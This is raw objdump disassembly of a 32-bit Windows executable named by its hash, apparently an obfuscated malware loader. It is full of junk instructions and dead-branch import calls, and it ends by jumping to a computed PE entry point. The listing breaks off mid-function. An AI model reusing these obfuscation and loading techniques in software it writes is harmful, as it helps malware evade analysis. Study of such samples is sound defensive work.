
7b234b18622b5c68fe979d04bef31661a50351a313dcc7297c9778317656e4d5.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xcc
  401009:	xor    DWORD PTR ds:0x422014,0x420f98
  401013:	push   edi
  401014:	sub    DWORD PTR ds:0x420fb0,0x420e8e
  40101e:	push   0x424545
  401023:	xor    edi,edi
  401025:	and    DWORD PTR ds:0x420efc,0x110f
  40102f:	inc    edi
  401030:	push   edi
  401031:	sbb    DWORD PTR ds:0x420f08,0x51
  40103b:	push   edi
  40103c:	adc    DWORD PTR ds:0x422000,0x3888
  401046:	call   DWORD PTR ds:0x4247ed
  40104c:	test   eax,eax
  40104e:	mov    DWORD PTR ds:0x420e8a,0x96
  401058:	je     0x40106f
  40105e:	xor    eax,eax
  401060:	mov    DWORD PTR ds:0x420ef0,0x42a7
  40106a:	jmp    0x4020ba
  40106f:	push   esi
  401070:	sbb    DWORD PTR ds:0x420e96,ebx
  401076:	mov    esi,DWORD PTR ds:0x4247e9
  40107c:	push   0x8
  40107e:	and    DWORD PTR ds:0x420e96,0x420ef4
  401088:	push   0x424565
  40108d:	sbb    DWORD PTR ds:0x420fa8,0x2663
  401097:	call   esi
  401099:	mov    DWORD PTR ds:0x420f58,0x2539
  4010a3:	test   eax,eax
  4010a5:	mov    DWORD PTR ds:0x420f74,0x63dd
  4010af:	jne    0x401117
  4010b5:	push   0xc
  4010b7:	adc    DWORD PTR ds:0x420efc,0x422010
  4010c1:	push   0x424579
  4010c6:	call   esi
  4010c8:	sbb    DWORD PTR ds:0x422000,0x6696
  4010d2:	test   eax,eax
  4010d4:	jne    0x401117
  4010da:	xor    DWORD PTR ds:0x422010,0x3be2
  4010e4:	push   0x42458d
  4010e9:	adc    DWORD PTR ds:0x420fac,0x420fa0
  4010f3:	push   edi
  4010f4:	push   edi
  4010f5:	call   DWORD PTR ds:0x424819
  4010fb:	add    DWORD PTR ds:0x420e7e,0x14dc
  401105:	test   eax,eax
  401107:	mov    DWORD PTR ds:0x420f08,0x3170
  401111:	je     0x401128
  401117:	xor    eax,eax
  401119:	mov    DWORD PTR ds:0x422014,0x5c19
  401123:	jmp    0x4020b9
  401128:	sbb    esi,DWORD PTR ds:0x420e9a
  40112e:	mov    DWORD PTR [ebp-0x10],0x0
  401135:	and    edi,0x6e17
  40113b:	mov    eax,DWORD PTR [ebp-0x24]
  40113e:	mov    DWORD PTR [ebp-0x24],eax
  401141:	sub    esi,DWORD PTR ds:0x420fa0
  401147:	mov    ecx,0xf89c85b5
  40114c:	mov    DWORD PTR [ebp-0x8],ecx
  40114f:	sub    esi,DWORD PTR ds:0x420f00
  401155:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  40115c:	sbb    edx,DWORD PTR ds:0x420e92
  401162:	lea    eax,[ebp-0x38]
  401165:	mov    DWORD PTR [ebp-0x2c],eax
  401168:	adc    DWORD PTR ds:0x420f74,edi
  40116e:	lea    eax,[ebp-0x30]
  401171:	xor    esi,esi
  401173:	or     esi,DWORD PTR ds:0x420e9a
  401179:	and    DWORD PTR ds:0x420f64,esi
  40117f:	mov    DWORD PTR [ebp-0x1c],eax
  401182:	sbb    esi,eax
  401184:	mov    eax,ds:0x424435
  401189:	mov    edi,DWORD PTR ds:0x420f48
  40118f:	mov    edx,DWORD PTR ds:0x420f84
  401195:	sub    edx,edi
  401197:	sub    edi,DWORD PTR [edi+edx*1]
  40119a:	mov    eax,DWORD PTR [eax+0x1c8]
  4011a0:	mov    eax,DWORD PTR [eax]
  4011a2:	mov    edx,DWORD PTR [ebp-0x1c]
  4011a5:	movzx  edi,BYTE PTR ds:0x420fb4
  4011ac:	add    DWORD PTR ds:0x420e8a,edi
  4011b2:	mov    esi,0x7510896
  4011b7:	xor    eax,esi
  4011b9:	and    DWORD PTR ds:0x420fa0,0x420e96
  4011c3:	mov    edi,0x3272dd
  4011c8:	add    eax,edi
  4011ca:	mov    DWORD PTR [edx],eax
  4011cc:	mov    DWORD PTR ds:0x420ea2,0x7e11
  4011d6:	mov    eax,ds:0x424675
  4011db:	cmp    eax,0x312bc9f6
  4011e0:	mov    DWORD PTR ds:0x420fa4,0x3707
  4011ea:	jne    0x40133f
  4011f0:	mov    eax,DWORD PTR [ebp-0x8]
  4011f3:	mov    edx,DWORD PTR ds:0x424435
  4011f9:	mov    edx,DWORD PTR [edx+0x198]
  4011ff:	xor    eax,esi
  401201:	add    eax,edi
  401203:	add    DWORD PTR ds:0x422010,0x420eec
  40120d:	mov    DWORD PTR [edx],eax
  40120f:	and    DWORD PTR ds:0x42200c,0x0
  401219:	jmp    0x40122d
  40121e:	xor    edx,edx
  401220:	add    edx,DWORD PTR ds:0x42200c
  401226:	inc    edx
  401227:	mov    DWORD PTR ds:0x42200c,edx
  40122d:	cmp    DWORD PTR ds:0x42200c,0x12
  401234:	jae    0x401276
  40123a:	cmp    DWORD PTR ds:0x42200c,0x5
  401241:	jne    0x401255
  401247:	push   DWORD PTR [ebp-0x18]
  40124a:	push   0x450b
  40124f:	call   DWORD PTR ds:0x4247d5
  401255:	cmp    DWORD PTR ds:0x42200c,0x4
  40125c:	jne    0x401271
  401262:	xor    edx,edx
  401264:	add    edx,DWORD PTR ds:0x42200c
  40126a:	inc    edx
  40126b:	mov    DWORD PTR ds:0x42200c,edx
  401271:	jmp    0x40121e
  401276:	mov    eax,DWORD PTR [ebp-0x8]
  401279:	and    DWORD PTR ds:0x420f70,0x0
  401283:	mov    edx,DWORD PTR ds:0x420f70
  401289:	inc    edx
  40128a:	mov    DWORD PTR ds:0x420f70,edx
  401290:	cmp    DWORD PTR ds:0x420f70,0x7
  401297:	jne    0x4012b0
  40129d:	push   0x5d66
  4012a2:	push   0x420f60
  4012a7:	push   DWORD PTR [ebp-0x14]
  4012aa:	call   DWORD PTR ds:0x4247d9
  4012b0:	cmp    DWORD PTR ds:0x420f70,0x6
  4012b7:	jne    0x4012ca
  4012bd:	mov    edx,DWORD PTR ds:0x420f70
  4012c3:	inc    edx
  4012c4:	mov    DWORD PTR ds:0x420f70,edx
  4012ca:	cmp    DWORD PTR ds:0x420f70,0x14
  4012d1:	jb     0x401283
  4012d7:	and    edx,0x4d07
  4012dd:	xor    eax,esi
  4012df:	movzx  edx,BYTE PTR ds:0x420f08
  4012e6:	sub    edx,DWORD PTR ds:0x420fa0
  4012ec:	mov    DWORD PTR ds:0x420f08,edx
  4012f2:	add    eax,edi
  4012f4:	mov    DWORD PTR ds:0x422008,0x18
  4012fe:	cmp    DWORD PTR ds:0x422008,0x0
  401305:	je     0x40133a
  40130b:	cmp    DWORD PTR ds:0x422008,0x1d
  401312:	jne    0x401328
  401318:	push   0x42406a
  40131d:	push   0x424044
  401322:	call   DWORD PTR ds:0x4247dd
  401328:	mov    edx,DWORD PTR ds:0x422008
  40132e:	dec    edx
  40132f:	mov    DWORD PTR ds:0x422008,edx
  401335:	jmp    0x4012fe
  40133a:	mov    ds:0x424675,eax
  40133f:	mov    eax,ds:0x424435
  401344:	and    DWORD PTR ds:0x420ef4,0x0
  40134e:	mov    edx,DWORD PTR ds:0x420ef4
  401354:	inc    edx
  401355:	mov    DWORD PTR ds:0x420ef4,edx
  40135b:	cmp    DWORD PTR ds:0x420ef4,0x20
  401362:	jne    0x401379
  401368:	push   DWORD PTR [ebp-0x18]
  40136b:	push   0x222d
  401370:	push   DWORD PTR [ebp-0x28]
  401373:	call   DWORD PTR ds:0x4247e1
  401379:	cmp    DWORD PTR ds:0x420ef4,0x12
  401380:	jb     0x40134e
  401386:	mov    eax,DWORD PTR [eax+0x18c]
  40138c:	mov    eax,DWORD PTR [eax]
  40138e:	adc    DWORD PTR ds:0x422014,0x7308
  401398:	mov    DWORD PTR [ebp-0x68],eax
  40139b:	and    DWORD PTR ds:0x420e7e,0x0
  4013a5:	xor    eax,eax
  4013a7:	or     eax,DWORD PTR ds:0x420e7e
  4013ad:	inc    eax
  4013ae:	mov    ds:0x420e7e,eax
  4013b3:	cmp    DWORD PTR ds:0x420e7e,0xa
  4013ba:	jne    0x4013d1
  4013c0:	push   DWORD PTR [ebp-0x20]
  4013c3:	push   0x420f74
  4013c8:	push   DWORD PTR [ebp-0x28]
  4013cb:	call   DWORD PTR ds:0x4247e5
  4013d1:	cmp    DWORD PTR ds:0x420e7e,0x9
  4013d8:	jne    0x4013ec
  4013de:	xor    eax,eax
  4013e0:	xor    eax,DWORD PTR ds:0x420e7e
  4013e6:	inc    eax
  4013e7:	mov    ds:0x420e7e,eax
  4013ec:	cmp    DWORD PTR ds:0x420e7e,0x14
  4013f3:	jb     0x4013a5
  4013f9:	mov    DWORD PTR ds:0x420f04,0x16
  401403:	cmp    DWORD PTR ds:0x420f04,0x0
  40140a:	je     0x401438
  401410:	cmp    DWORD PTR ds:0x420f04,0x22
  401417:	jne    0x401423
  40141d:	call   DWORD PTR ds:0x4247f1
  401423:	xor    eax,eax
  401425:	or     eax,DWORD PTR ds:0x420f04
  40142b:	dec    eax
  40142c:	mov    ds:0x420f04,eax
  401431:	jmp    0x401403
  401436:	sub    edx,edx
  401438:	push   ebx
  401439:	or     eax,DWORD PTR ds:0x420f00
  40143f:	mov    ebx,0xf89c85b1
  401444:	and    DWORD PTR ds:0x420fa0,0x0
  40144e:	mov    edx,DWORD PTR ds:0x420fa0
  401454:	inc    edx
  401455:	mov    DWORD PTR ds:0x420fa0,edx
  40145b:	cmp    DWORD PTR ds:0x420fa0,0x8
  401462:	jne    0x40146e
  401468:	call   DWORD PTR ds:0x4247f5
  40146e:	cmp    DWORD PTR ds:0x420fa0,0x7
  401475:	jne    0x40148a
  40147b:	xor    edx,edx
  40147d:	xor    edx,DWORD PTR ds:0x420fa0
  401483:	inc    edx
  401484:	mov    DWORD PTR ds:0x420fa0,edx
  40148a:	cmp    DWORD PTR ds:0x420fa0,0x1e
  401491:	jb     0x40144e
  401497:	and    DWORD PTR ds:0x420e7a,0x0
  4014a1:	jmp    0x4014b3
  4014a6:	mov    edx,DWORD PTR ds:0x420e7a
  4014ac:	inc    edx
  4014ad:	mov    DWORD PTR ds:0x420e7a,edx
  4014b3:	cmp    DWORD PTR ds:0x420e7a,0x14
  4014ba:	jae    0x4014ff
  4014c0:	cmp    DWORD PTR ds:0x420e7a,0x1f
  4014c7:	jne    0x4014f0
  4014cd:	push   0x20c6
  4014d2:	push   DWORD PTR [ebp-0x10]
  4014d5:	push   0x420ea2
  4014da:	push   0x440c
  4014df:	push   DWORD PTR [ebp-0x20]
  4014e2:	push   0x7f92
  4014e7:	push   DWORD PTR [ebp-0x20]
  4014ea:	call   DWORD PTR ds:0x4247f9
  4014f0:	jmp    0x4014a6
  4014f5:	adc    DWORD PTR ds:0x420ea2,0x7cfc
  4014ff:	mov    DWORD PTR [ebp-0x10],ebx
  401502:	sub    DWORD PTR ds:0x420f5c,edi
  401508:	mov    DWORD PTR [ebp-0x10],ebx
  40150b:	mov    DWORD PTR ds:0x420f04,0x12
  401515:	cmp    DWORD PTR ds:0x420f04,0x0
  40151c:	je     0x40156b
  401522:	cmp    DWORD PTR ds:0x420f04,0x5
  401529:	jne    0x40153d
  40152f:	push   DWORD PTR [ebp-0x1c]
  401532:	push   0x424044
  401537:	call   DWORD PTR ds:0x4247fd
  40153d:	cmp    DWORD PTR ds:0x420f04,0x6
  401544:	jne    0x401557
  40154a:	mov    edx,DWORD PTR ds:0x420f04
  401550:	dec    edx
  401551:	mov    DWORD PTR ds:0x420f04,edx
  401557:	xor    edx,edx
  401559:	or     edx,DWORD PTR ds:0x420f04
  40155f:	dec    edx
  401560:	mov    DWORD PTR ds:0x420f04,edx
  401566:	jmp    0x401515
  40156b:	mov    DWORD PTR [ebp-0x10],ebx
  40156e:	and    DWORD PTR ds:0x422004,0x0
  401578:	jmp    0x40158c
  40157d:	xor    edx,edx
  40157f:	xor    edx,DWORD PTR ds:0x422004
  401585:	inc    edx
  401586:	mov    DWORD PTR ds:0x422004,edx
  40158c:	cmp    DWORD PTR ds:0x422004,0x12
  401593:	jae    0x4015bd
  401599:	cmp    DWORD PTR ds:0x422004,0x1e
  4015a0:	jne    0x4015b8
  4015a6:	push   0x424168
  4015ab:	push   0x1
  4015ad:	push   0x0
  4015af:	push   DWORD PTR [ebp-0x14]
  4015b2:	call   DWORD PTR ds:0x424801
  4015b8:	jmp    0x40157d
  4015bd:	mov    DWORD PTR [ebp-0x1c],ecx
  4015c0:	xor    edx,edx
  4015c2:	mov    DWORD PTR [ebp-0x10],ebx
  4015c5:	mov    DWORD PTR ds:0x420e96,0xb45
  4015cf:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  4015d6:	and    DWORD PTR ds:0x422014,0x2ed5
  4015e0:	mov    eax,DWORD PTR [ebp-0x8]
  4015e3:	mov    ecx,DWORD PTR [ebp-0xc]
  4015e6:	xor    edx,edx
  4015e8:	or     edx,DWORD PTR ds:0x420f60
  4015ee:	and    DWORD PTR ds:0x422000,edx
  4015f4:	mov    edx,DWORD PTR [ebp-0xc]
  4015f7:	sbb    DWORD PTR ds:0x420fa0,0x420fb4
  401601:	xor    edx,esi
  401603:	and    DWORD PTR ds:0x420f5c,0x420fa4
  40160d:	xor    ecx,esi
  40160f:	sub    DWORD PTR ds:0x422008,0x420f58
  401619:	add    ecx,edx
  40161b:	sbb    DWORD PTR ds:0x420e8e,edi
  401621:	mov    edx,DWORD PTR [ebp-0xc]
  401624:	xor    DWORD PTR ds:0x420f00,0x7b1e
  40162e:	xor    eax,esi
  401630:	xor    edx,esi
  401632:	or     DWORD PTR ds:0x420e9a,0x7d42
  40163c:	add    eax,edi
  40163e:	lea    ecx,[ecx+edx*1+0x975897]
  401645:	not    DWORD PTR ds:0x420f70
  40164b:	mov    DWORD PTR [ebp-0x18],eax
  40164e:	mov    DWORD PTR ds:0x420e7e,0x57b9
  401658:	cmp    eax,ecx
  40165a:	ja     0x40177e
  401660:	jmp    0x401678
  401665:	mov    eax,ds:0x420f30
  40166a:	mov    ecx,DWORD PTR ds:0x420f38
  401670:	sub    ecx,eax
  401672:	and    eax,DWORD PTR [eax+ecx*1]
  401675:	mov    eax,DWORD PTR [ebp-0x18]
  401678:	mov    ecx,DWORD PTR [ebp-0xc]
  40167b:	sub    DWORD PTR ds:0x422010,0x420f70
  401685:	xor    ecx,esi
  401687:	lea    eax,[ecx+eax*1+0x3272dd]
  40168e:	or     DWORD PTR ds:0x420f70,0x48c8
  401698:	push   eax
  401699:	sub    DWORD PTR ds:0x420e9e,0x506d
  4016a3:	mov    eax,DWORD PTR [ebp-0x1c]
  4016a6:	and    DWORD PTR ds:0x420f5c,0x3822
  4016b0:	xor    eax,esi
  4016b2:	xor    DWORD PTR ds:0x420f74,0x420ef0
  4016bc:	lea    eax,[ebp+eax*1+0x3272e5]
  4016c3:	or     DWORD PTR ds:0x420ea2,0x420f60
  4016cd:	push   eax
  4016ce:	or     DWORD PTR ds:0x420f00,0x5827
  4016d8:	mov    eax,ds:0x424435
  4016dd:	and    DWORD PTR ds:0x420fb4,0x420fa4
  4016e7:	push   DWORD PTR [eax+0x1bc]
  4016ed:	xor    DWORD PTR ds:0x420f98,0x420ea2
  4016f7:	call   0x4020cd
  4016fc:	add    DWORD PTR ds:0x420f68,0x6b04
  401706:	mov    eax,DWORD PTR [ebp-0xc]
  401709:	or     edx,DWORD PTR ds:0x420ef0
  40170f:	mov    ecx,DWORD PTR [ebp-0x18]
  401712:	neg    edx
  401714:	xor    eax,esi
  401716:	sub    edx,0x4f8d
  40171c:	lea    eax,[ecx+eax*1+0x3272dd]
  401723:	mov    ecx,DWORD PTR [ebp-0xc]
  401726:	xor    edx,DWORD PTR ds:0x420e7a
  40172c:	mov    edx,DWORD PTR [ebp-0xc]
  40172f:	xor    edx,esi
  401731:	add    DWORD PTR ds:0x420ef4,0x420e9e
  40173b:	xor    ecx,esi
  40173d:	adc    DWORD PTR ds:0x420e82,0x420f5c
  401747:	add    ecx,edx
  401749:	mov    edx,DWORD PTR [ebp-0xc]
  40174c:	xor    edx,esi
  40174e:	lea    ecx,[ecx+edx*1+0x975897]
  401755:	mov    DWORD PTR ds:0x420e82,0x59f5
  40175f:	mov    DWORD PTR [ebp-0x18],eax
  401762:	mov    DWORD PTR ds:0x420f98,0x3280
  40176c:	cmp    eax,ecx
  40176e:	mov    DWORD PTR ds:0x420fb4,0x7b83
  401778:	jbe    0x401665
  40177e:	and    DWORD PTR ds:0x420f98,0x0
  401788:	mov    ecx,DWORD PTR ds:0x420f98
  40178e:	inc    ecx
  40178f:	mov    DWORD PTR ds:0x420f98,ecx
  401795:	cmp    DWORD PTR ds:0x420f98,0x1e
  40179c:	jne    0x4017b2
  4017a2:	push   0x420fa0
  4017a7:	push   0x4d18
  4017ac:	call   DWORD PTR ds:0x424805
  4017b2:	cmp    DWORD PTR ds:0x420f98,0x18
  4017b9:	jb     0x401788
  4017bf:	mov    eax,DWORD PTR [ebp+0xc]
  4017c2:	sbb    DWORD PTR ds:0x420e7a,edx
  4017c8:	mov    ds:0x4242b9,eax
  4017cd:	and    DWORD PTR ds:0x420f74,0x0
  4017d7:	mov    eax,ds:0x420f74
  4017dc:	inc    eax
  4017dd:	mov    ds:0x420f74,eax
  4017e2:	cmp    DWORD PTR ds:0x420f74,0x1b
  4017e9:	jne    0x40180f
  4017ef:	push   DWORD PTR [ebp-0x1c]
  4017f2:	push   0x420f9c
  4017f7:	push   0x46e8
  4017fc:	push   0x4240e4
  401801:	push   0x1c79
  401806:	push   DWORD PTR [ebp-0xc]
  401809:	call   DWORD PTR ds:0x42480d
  40180f:	cmp    DWORD PTR ds:0x420f74,0x12
  401816:	jb     0x4017d7
  40181c:	mov    eax,DWORD PTR [ebp+0x10]
  40181f:	sub    ecx,DWORD PTR ds:0x420fa4
  401825:	mov    ds:0x42450d,eax
  40182a:	and    DWORD PTR ds:0x422010,0x0
  401834:	mov    eax,ds:0x422010
  401839:	inc    eax
  40183a:	mov    ds:0x422010,eax
  40183f:	cmp    DWORD PTR ds:0x422010,0x18
  401846:	jne    0x401852
  40184c:	call   DWORD PTR ds:0x424811
  401852:	cmp    DWORD PTR ds:0x422010,0x17
  401859:	jb     0x401834
  40185f:	add    ecx,ecx
  401861:	mov    eax,ds:0x4242b9
  401866:	or     DWORD PTR ds:0x420e7a,0x2e1b
  401870:	mov    ecx,DWORD PTR [ebp-0x2c]
  401873:	sub    eax,edi
  401875:	neg    DWORD PTR ds:0x420e92
  40187b:	xor    eax,esi
  40187d:	mov    DWORD PTR ds:0x420fac,0x2c59
  401887:	mov    DWORD PTR [ecx],eax
  401889:	mov    ecx,DWORD PTR [ebp-0x24]
  40188c:	mov    DWORD PTR ds:0x420efc,0x2f09
  401896:	mov    eax,0xf89c85b5
  40189b:	mov    DWORD PTR ds:0x420efc,0x2084
  4018a5:	cmp    ecx,eax
  4018a7:	jne    0x401be5
  4018ad:	xor    DWORD PTR ds:0x422014,0x4966
  4018b7:	lea    eax,[ebp-0x34]
  4018ba:	adc    DWORD PTR ds:0x420e8a,0x420e92
  4018c4:	mov    DWORD PTR [ebp-0x70],eax
  4018c7:	xor    DWORD PTR ds:0x420f74,0x422004
  4018d1:	lea    eax,[ebp+0x4]
  4018d4:	sub    DWORD PTR ds:0x420fa4,0x42200c
  4018de:	mov    DWORD PTR [ebp-0x34],eax
  4018e1:	mov    eax,DWORD PTR [ebp-0x34]
  4018e4:	test   eax,eax
  4018e6:	mov    DWORD PTR ds:0x420e82,0x6242
  4018f0:	je     0x40209d
  4018f6:	xor    DWORD PTR ds:0x422008,0x2d73
  401900:	mov    eax,DWORD PTR [ebp-0x20]
  401903:	mov    eax,DWORD PTR [ebp-0xc]
  401906:	mov    eax,DWORD PTR [ebp-0x8]
  401909:	adc    ecx,0x7834
  40190f:	mov    DWORD PTR [ebp+0xc],eax
  401912:	not    ecx
  401914:	mov    eax,eax
  401916:	mov    eax,ds:0x424435
  40191b:	and    DWORD PTR ds:0x422008,0x0
  401925:	mov    ecx,DWORD PTR ds:0x422008
  40192b:	inc    ecx
  40192c:	mov    DWORD PTR ds:0x422008,ecx
  401932:	cmp    DWORD PTR ds:0x422008,0x1e
  401939:	jne    0x40194a
  40193f:	push   0x422000
  401944:	call   DWORD PTR ds:0x424815
  40194a:	cmp    DWORD PTR ds:0x422008,0x1d
  401951:	jb     0x401925
  401957:	and    DWORD PTR ds:0x420fa0,0x0
  401961:	jmp    0x401973
  401966:	mov    ecx,DWORD PTR ds:0x420fa0
  40196c:	inc    ecx
  40196d:	mov    DWORD PTR ds:0x420fa0,ecx
  401973:	cmp    DWORD PTR ds:0x420fa0,0x14
  40197a:	jae    0x4019bc
  401980:	cmp    DWORD PTR ds:0x420fa0,0x5
  401987:	jne    0x40199d
  40198d:	push   0x2f20
  401992:	push   0x8e83
  401997:	call   DWORD PTR ds:0x4247d5
  40199d:	cmp    DWORD PTR ds:0x420fa0,0x4
  4019a4:	jne    0x4019b7
  4019aa:	mov    ecx,DWORD PTR ds:0x420fa0
  4019b0:	inc    ecx
  4019b1:	mov    DWORD PTR ds:0x420fa0,ecx
  4019b7:	jmp    0x401966
  4019bc:	mov    eax,DWORD PTR [eax+0x1c8]
  4019c2:	neg    DWORD PTR ds:0x420f98
  4019c8:	mov    eax,DWORD PTR [eax]
  4019ca:	sbb    DWORD PTR ds:0x420f74,ebx
  4019d0:	cdq    
  4019d1:	adc    DWORD PTR ds:0x42200c,0x4213
  4019db:	mov    ebx,eax
  4019dd:	mov    DWORD PTR ds:0x420fa4,0x17
  4019e7:	cmp    DWORD PTR ds:0x420fa4,0x0
  4019ee:	je     0x401a74
  4019f4:	cmp    DWORD PTR ds:0x420fa4,0x20
  4019fb:	jne    0x401a14
  401a01:	push   DWORD PTR [ebp-0x1c]
  401a04:	push   0x420e9a
  401a09:	push   0x6482
  401a0e:	call   DWORD PTR ds:0x4247d9
  401a14:	xor    eax,eax
  401a16:	or     eax,DWORD PTR ds:0x420fa4
  401a1c:	dec    eax
  401a1d:	mov    ds:0x420fa4,eax
  401a22:	jmp    0x4019e7
  401a27:	mov    DWORD PTR ds:0x420f08,0x1d
  401a31:	cmp    DWORD PTR ds:0x420f08,0x0
  401a38:	je     0x401a74
  401a3e:	cmp    DWORD PTR ds:0x420f08,0x1e
  401a45:	jne    0x401a5b
  401a4b:	push   0x424027
  401a50:	push   0x4240af
  401a55:	call   DWORD PTR ds:0x4247dd
  401a5b:	xor    eax,eax
  401a5d:	xor    eax,DWORD PTR ds:0x420f08
  401a63:	dec    eax
  401a64:	mov    ds:0x420f08,eax
  401a69:	jmp    0x401a31
  401a6e:	and    DWORD PTR ds:0x420e82,ebx
  401a74:	mov    eax,0xfabdbeed
  401a79:	add    ebx,eax
  401a7b:	inc    ecx
  401a7c:	adc    edx,0xffffffff
  401a7f:	mov    DWORD PTR ds:0x420fa0,0x16
  401a89:	cmp    DWORD PTR ds:0x420fa0,0x0
  401a90:	je     0x401b11
  401a96:	cmp    DWORD PTR ds:0x420fa0,0x20
  401a9d:	jne    0x401ab4
  401aa3:	push   DWORD PTR [ebp-0x10]
  401aa6:	push   0x1d23
  401aab:	push   DWORD PTR [ebp-0x1c]
  401aae:	call   DWORD PTR ds:0x4247e1
  401ab4:	xor    ecx,ecx
  401ab6:	xor    ecx,DWORD PTR ds:0x420fa0
  401abc:	dec    ecx
  401abd:	mov    DWORD PTR ds:0x420fa0,ecx
  401ac3:	jmp    0x401a89
  401ac8:	mov    DWORD PTR ds:0x42200c,0x1c
  401ad2:	cmp    DWORD PTR ds:0x42200c,0x0
  401ad9:	je     0x401b11
  401adf:	cmp    DWORD PTR ds:0x42200c,0x2c
  401ae6:	jne    0x401aff
  401aec:	push   0x87f3
  401af1:	push   0x420f68
  401af6:	push   DWORD PTR [ebp-0xc]
  401af9:	call   DWORD PTR ds:0x4247e5
  401aff:	mov    ecx,DWORD PTR ds:0x42200c
  401b05:	dec    ecx
  401b06:	mov    DWORD PTR ds:0x42200c,ecx
  401b0c:	jmp    0x401ad2
  401b11:	and    DWORD PTR [ebp-0x10],0x0
  401b15:	sbb    DWORD PTR ds:0x422014,ebx
  401b1b:	xor    edx,0x0
  401b1e:	xor    ecx,DWORD PTR ds:0x420f70
  401b24:	mov    DWORD PTR [ebp-0x54],edx
  401b27:	adc    ecx,edx
  401b29:	mov    edx,DWORD PTR [ebp+0xc]
  401b2c:	mov    DWORD PTR [ebp-0x14],edx
  401b2f:	mov    ecx,0x8a29a127
  401b34:	xor    ebx,ecx
  401b36:	dec    edx
  401b37:	add    DWORD PTR [ebp-0x14],eax
  401b3a:	mov    DWORD PTR ds:0x420e96,edi
  401b40:	mov    edx,DWORD PTR [ebp-0x14]
  401b43:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401b47:	or     DWORD PTR ds:0x420f6c,0x420f00
  401b51:	xor    edx,ecx
  401b53:	add    DWORD PTR ds:0x420e86,0x420f04
  401b5d:	mov    DWORD PTR [ebp-0x4c],edx
  401b60:	mov    edx,DWORD PTR [ebp-0x10]
  401b63:	xor    edx,0x0
  401b66:	mov    DWORD PTR [ebp-0x48],edx
  401b69:	mov    DWORD PTR ds:0x420efc,0x3c82
  401b73:	cmp    DWORD PTR [ebp-0x4c],ebx
  401b76:	jne    0x401b92
  401b7c:	mov    DWORD PTR ds:0x420e92,0x5ff4
  401b86:	mov    edx,DWORD PTR [ebp-0x54]
  401b89:	cmp    DWORD PTR [ebp-0x48],edx
  401b8c:	je     0x401bc1
  401b92:	mov    edx,DWORD PTR ds:0x424435
  401b98:	mov    edx,DWORD PTR [edx+0x1c0]
  401b9e:	mov    edx,DWORD PTR [edx]
  401ba0:	xor    ebx,ebx
  401ba2:	add    edx,eax
  401ba4:	adc    ebx,0xffffffff
  401ba7:	xor    edx,ecx
  401ba9:	xor    ebx,0x0
  401bac:	cmp    edx,0x70941fc9
  401bb2:	jne    0x40209d
  401bb8:	cmp    ebx,0xffffffff
  401bbb:	jne    0x40209d
  401bc1:	mov    edx,DWORD PTR ds:0x4244b1
  401bc7:	mov    ebx,DWORD PTR ds:0x4244b9
  401bcd:	xor    edx,ebx
  401bcf:	mov    DWORD PTR ds:0x4244b1,edx
  401bd5:	mov    ebx,DWORD PTR ds:0x4244b1
  401bdb:	mov    edx,DWORD PTR [ebp-0x34]
  401bde:	add    DWORD PTR [edx],ebx
  401be0:	jmp    0x40205e
  401be5:	mov    ecx,DWORD PTR [ebp-0x38]
  401be8:	cmp    ecx,0xf89c85b2
  401bee:	je     0x401c4b
  401bf4:	mov    ecx,DWORD PTR [ebp-0x8]
  401bf7:	mov    edx,DWORD PTR [ebp-0x30]
  401bfa:	xor    ecx,esi
  401bfc:	add    ecx,edi
  401bfe:	cmp    ecx,edx
  401c00:	je     0x401c4b
  401c06:	mov    eax,ds:0x424435
  401c0b:	mov    eax,DWORD PTR [eax+0x194]
  401c11:	mov    ecx,DWORD PTR [eax]
  401c13:	mov    eax,DWORD PTR [ecx+0x3c]
  401c16:	push   DWORD PTR ds:0x42450d
  401c1c:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401c20:	push   DWORD PTR ds:0x4242b9
  401c26:	add    eax,ecx
  401c28:	mov    ecx,DWORD PTR ds:0x424435
  401c2e:	mov    ecx,DWORD PTR [ecx+0x194]
  401c34:	push   DWORD PTR [ecx]
  401c36:	call   eax
  401c38:	mov    ecx,DWORD PTR ds:0x424435
  401c3e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401c44:	mov    DWORD PTR [ecx],eax
  401c46:	jmp    0x40209d
  401c4b:	mov    ecx,DWORD PTR [ebp-0x8]
  401c4e:	mov    edx,DWORD PTR [ebp-0x68]
  401c51:	xor    ecx,esi
  401c53:	add    ecx,edi
  401c55:	cmp    ecx,edx
  401c57:	jne    0x401f61
  401c5d:	mov    ecx,DWORD PTR [ebp-0x8]
  401c60:	mov    edx,DWORD PTR ds:0x424435
  401c66:	mov    edx,DWORD PTR [edx+0x198]
  401c6c:	xor    ecx,esi
  401c6e:	add    ecx,edi
  401c70:	cmp    ecx,DWORD PTR [edx]
  401c72:	jne    0x401c8d
  401c78:	push   eax
  401c79:	mov    eax,DWORD PTR [ebp-0x8]
  401c7c:	xor    eax,esi
  401c7e:	add    eax,edi
  401c80:	push   eax
  401c81:	push   ebx
  401c82:	push   DWORD PTR [ebp-0xc]
  401c85:	push   DWORD PTR [ebp-0x8]
  401c88:	call   0x40772b
  401c8d:	mov    eax,DWORD PTR [ebp-0xc]
  401c90:	mov    DWORD PTR [ebp-0x3c],eax
  401c93:	mov    eax,DWORD PTR [ebp-0x8]
  401c96:	mov    DWORD PTR [ebp-0x18],eax
  401c99:	mov    eax,DWORD PTR [ebp-0x18]
  401c9c:	xor    eax,esi
  401c9e:	add    eax,edi
  401ca0:	mov    DWORD PTR [ebp+0x10],eax
  401ca3:	mov    eax,ds:0x4242b5
  401ca8:	mov    eax,DWORD PTR [eax]
  401caa:	mov    DWORD PTR [ebp+0x10],eax
  401cad:	mov    eax,ds:0x4244bd
  401cb2:	mov    eax,DWORD PTR [eax]
  401cb4:	mov    DWORD PTR [ebp-0x1c],eax
  401cb7:	mov    DWORD PTR [ebp+0xc],0xf89c87b5
  401cbe:	mov    eax,DWORD PTR [ebp+0xc]
  401cc1:	xor    eax,esi
  401cc3:	add    eax,edi
  401cc5:	mov    DWORD PTR [ebp+0xc],eax
  401cc8:	mov    eax,ds:0x424435
  401ccd:	mov    DWORD PTR [ebp+0xc],eax
  401cd0:	mov    eax,DWORD PTR [ebp+0x10]
  401cd3:	mov    DWORD PTR [ebp+0xc],eax
  401cd6:	mov    eax,DWORD PTR [ebp+0xc]
  401cd9:	push   0x4
